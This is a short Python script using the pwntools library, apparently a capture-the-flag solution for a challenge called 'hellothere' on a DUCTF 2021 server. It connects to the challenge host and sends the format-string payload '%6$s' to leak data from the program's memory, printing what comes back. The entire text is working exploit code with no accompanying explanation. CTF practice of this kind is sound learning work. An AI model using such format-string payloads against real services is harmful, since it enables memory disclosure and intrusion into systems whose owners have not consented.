from pwn import *

io = remote('pwn-2021.duc.tf', 31918)
#io = process('./hellothere')

payload = '%6$s'

print(io.recv())
io.sendline(payload)
print(io.recvuntil(b'Hello there, '))
print(io.recv())
